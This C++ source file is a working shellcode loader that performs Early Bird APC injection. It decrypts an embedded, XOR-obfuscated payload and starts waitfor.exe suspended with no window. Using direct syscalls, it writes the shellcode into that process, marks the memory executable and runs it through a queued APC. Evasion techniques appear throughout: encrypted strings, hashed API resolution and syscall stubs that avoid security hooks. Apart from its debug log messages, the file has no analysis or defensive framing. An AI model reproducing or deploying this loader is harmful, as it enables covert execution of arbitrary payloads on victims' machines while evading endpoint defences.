#include "inject.hpp"
#include "syscalls.hpp"
#include "embeds.hpp"
#include "xor.hpp"
#include "obfuscation.hpp"
#include "handler_util.hpp"
#include "util.hpp"

DWORD InjectAndSpawn(shared_func_pointers* fp, logger_ctx* log_ctx) {
    DWORD result;
    HANDLE h_process = NULL;
    HANDLE h_thread = NULL;
    LPVOID local_shellcode = NULL;
    LPVOID remote_shellcode = NULL;

    result = InitSyscalls();
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(log_ctx, XorString("Failed to initialize syscalls. Error code: %d"), result);
        return result;
    }

    VirtualAlloc_t fp_VirtualAlloc = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualAlloc);
    if (!fp_VirtualAlloc) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve VirtualAlloc"));
        return FAIL_GET_VIRTUALALLOC;
    }

    do {
        AesLogger::LogDebug(log_ctx, XorString("Decrypting embedded shellcode."));

        unsigned char key[PAYLOAD_KEY_LEN];
        memcpy(key, embedded::payload_key.data(), PAYLOAD_KEY_LEN);
        encryption::XorInPlace(key, PAYLOAD_KEY_LEN, KEY_XOR_KEY);

        size_t shellcode_size = embedded::payload.size();
        local_shellcode = fp_VirtualAlloc(NULL, shellcode_size, MEM_COMMIT, PAGE_READWRITE);
        if (!local_shellcode) {
            result = fp->fp_GetLastError();
            AesLogger::LogError(log_ctx, XorString("Failed to allocate local shellcode buffer. Error code: %d"), result);
            break;
        }
        memcpy(local_shellcode, embedded::payload.data(), shellcode_size);
        encryption::TripleXorInPlace((unsigned char*)local_shellcode, shellcode_size, key, PAYLOAD_KEY_LEN);
        pi_memset(key, 0, PAYLOAD_KEY_LEN);

        AesLogger::LogDebug(log_ctx, XorString("Creating waitfor.exe suspended via CreateProcessW."));

        CreateProcessW_t fp_CreateProcessW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateProcessW);
        if (!fp_CreateProcessW) {
            AesLogger::LogError(log_ctx, XorString("Failed to resolve CreateProcessW"));
            result = FAIL_GET_CREATEPROCESSW;
            break;
        }

        wchar_t* waitfor_cmd = XorStringW(L"waitfor.exe /T 99999 Evt8a3f1d7c2e");
        STARTUPINFOW startup_info;
        PROCESS_INFORMATION process_info;
        ZeroMemory(&startup_info, sizeof(startup_info));
        ZeroMemory(&process_info, sizeof(process_info));
        startup_info.cb = sizeof(startup_info);

        if (!fp_CreateProcessW(
            NULL,
            waitfor_cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info
        )) {
            result = fp->fp_GetLastError();
            AesLogger::LogError(log_ctx, XorString("CreateProcessW failed. Error code: %d"), result);
            break;
        }

        h_process = process_info.hProcess;
        h_thread = process_info.hThread;

        AesLogger::LogInfo(log_ctx, XorString("Created suspended waitfor.exe. PID=%d"), process_info.dwProcessId);

        AesLogger::LogDebug(log_ctx, XorString("Allocating remote memory in waitfor.exe."));
        NTSTATUS status;
        SIZE_T region_size = shellcode_size;
        remote_shellcode = NULL;
        status = SysNtAllocateVirtualMemory(
            h_process,
            &remote_shellcode,
            0,
            &region_size,
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtAllocateVirtualMemory failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogDebug(log_ctx, XorString("Writing shellcode to remote process at 0x%p."), remote_shellcode);
        status = SysNtWriteVirtualMemory(
            h_process,
            remote_shellcode,
            local_shellcode,
            shellcode_size,
            NULL
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtWriteVirtualMemory failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogDebug(log_ctx, XorString("Changing remote memory to PAGE_EXECUTE_READ."));
        {
            PVOID protect_addr = remote_shellcode;
            SIZE_T protect_size = shellcode_size;
            ULONG old_protect = 0;
            status = SysNtProtectVirtualMemory(
                h_process,
                &protect_addr,
                &protect_size,
                PAGE_EXECUTE_READ,
                &old_protect
            );
            if (status != 0) {
                AesLogger::LogError(log_ctx, XorString("NtProtectVirtualMemory failed. NTSTATUS: 0x%08X"), status);
                result = status;
                break;
            }
        }

        AesLogger::LogDebug(log_ctx, XorString("Queuing APC to main thread."));
        status = SysNtQueueApcThread(
            h_thread,
            remote_shellcode,
            NULL,
            NULL,
            NULL
        );
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtQueueApcThread failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogDebug(log_ctx, XorString("Resuming waitfor.exe main thread."));
        status = SysNtResumeThread(h_thread, NULL);
        if (status != 0) {
            AesLogger::LogError(log_ctx, XorString("NtResumeThread failed. NTSTATUS: 0x%08X"), status);
            result = status;
            break;
        }

        AesLogger::LogSuccess(log_ctx, XorString("Early Bird APC injection complete. Shellcode running in waitfor.exe."));
        result = ERROR_SUCCESS;
    } while (false);

    if (h_process) {
        fp->fp_CloseHandle(h_process);
    }
    if (h_thread) {
        fp->fp_CloseHandle(h_thread);
    }

    if (local_shellcode) {
        VirtualFree_t fp_VirtualFree = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualFree);
        if (fp_VirtualFree) {
            fp_VirtualFree(local_shellcode, 0, MEM_RELEASE);
        }
    }

    return result;
}
